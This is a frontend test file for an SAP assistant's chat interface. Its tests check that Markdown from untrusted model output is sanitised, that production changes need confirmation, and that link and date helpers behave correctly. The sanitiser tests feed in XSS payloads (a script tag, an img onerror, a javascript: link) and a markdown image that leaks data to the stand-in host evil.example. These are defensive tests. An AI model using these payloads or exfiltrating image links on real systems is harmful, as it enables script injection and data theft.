import type { UIComponent } from '@prowess/contracts';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import Markdown from '@/components/chat/Markdown';
import { SapComponent } from '@/components/sap/cards';
import { ConfirmationCard } from '@/components/chat/ConfirmationCard';
import { groupConversations, safeHref } from '@/lib/format';

describe('Markdown rendering of untrusted model output', () => {
  const html = renderToStaticMarkup(
    <Markdown
      text={[
        '**bold** and a [safe link](https://help.sap.com/x)',
        '<script>alert(1)</script><img src=x onerror=alert(2)>',
        '[click me](javascript:alert(3))',
        '![tracker](https://evil.example/leak?data=secret)',
        '| a | b |\n|---|---|\n| 1 | 2 |',
      ].join('\n\n')}
    />,
  );

  it('drops raw HTML', () => {
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
  });

  it('neutralizes javascript: links and hardens safe ones', () => {
    expect(html).not.toContain('javascript:');
    expect(html).toContain('href="https://help.sap.com/x"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('never loads images (exfiltration channel)', () => {
    expect(html).not.toMatch(/<img/);
    expect(html).toContain('[image: tracker');
  });

  it('renders GFM tables', () => {
    expect(html).toContain('<table>');
  });
});

describe('SAP component registry', () => {
  it('renders a trusted invoice card with the payment block', () => {
    const component: UIComponent = {
      type: 'invoice',
      data: {
        number: '5100012345',
        fiscalYear: '2026',
        companyCode: '1000',
        vendorId: '1000123',
        vendorName: 'ABC Trading LLC',
        amount: { amount: 428350, currency: 'SAR' },
        status: 'PAYMENT_BLOCKED',
        paymentBlock: { code: 'R', description: 'Invoice verification' },
        blockReasons: ['Quantity variance'],
      },
    };
    const html = renderToStaticMarkup(<SapComponent component={component} />);
    expect(html).toContain('5100012345');
    expect(html).toContain('Payment blocked');
    expect(html).toContain('Invoice verification');
    expect(html).toContain('Quantity variance');
  });

  it('renders nothing for unknown component types', () => {
    const html = renderToStaticMarkup(<SapComponent component={{ type: 'html', data: '<b>x</b>' } as unknown as UIComponent} />);
    expect(html).toBe('');
  });
});

describe('Confirmation card', () => {
  const base = {
    id: 'a_1',
    action: 'Release invoice payment block',
    targetSystem: 'S4-PRD',
    businessObject: { type: 'Supplier invoice', id: '5100012345/2026' },
    proposedChange: 'Remove block R',
    impact: 'Invoice becomes payable',
    risk: 'HIGH_IMPACT' as const,
    expiresAt: new Date(Date.now() + 600_000).toISOString(),
    status: 'pending' as const,
  };

  it('requires explicit acknowledgement for production', () => {
    const html = renderToStaticMarkup(<ConfirmationCard confirmation={{ ...base, environment: 'PROD' }} onResolved={() => undefined} />);
    expect(html).toContain('PRODUCTION');
    expect(html).toContain('I understand this changes');
    expect(html).toMatch(/<button[^>]*disabled=""[^>]*>Confirm<\/button>/);
  });

  it('shows action, system, object, change and impact', () => {
    const html = renderToStaticMarkup(<ConfirmationCard confirmation={{ ...base, environment: 'QA' }} onResolved={() => undefined} />);
    for (const text of ['Release invoice payment block', 'S4-PRD', '5100012345/2026', 'Remove block R', 'Invoice becomes payable', 'Cancel', 'Confirm']) {
      expect(html).toContain(text);
    }
  });
});

describe('format helpers', () => {
  it('only allows http(s)/mailto hrefs', () => {
    expect(safeHref('javascript:alert(1)')).toBeUndefined();
    expect(safeHref('/relative')).toBeUndefined();
    expect(safeHref('https://sap.com')).toBe('https://sap.com/');
  });

  it('groups conversations by recency', () => {
    const now = new Date('2026-09-29T12:00:00');
    const at = (d: string) => ({ id: d, title: d, agent: 'fico', createdAt: d, updatedAt: d });
    const groups = groupConversations([at('2026-09-29T09:00:00'), at('2026-09-28T09:00:00'), at('2026-09-25T09:00:00'), at('2026-08-01T09:00:00')], now);
    expect(groups.map((g) => g.label)).toEqual(['Today', 'Yesterday', 'Previous 7 Days', 'Older']);
  });
});
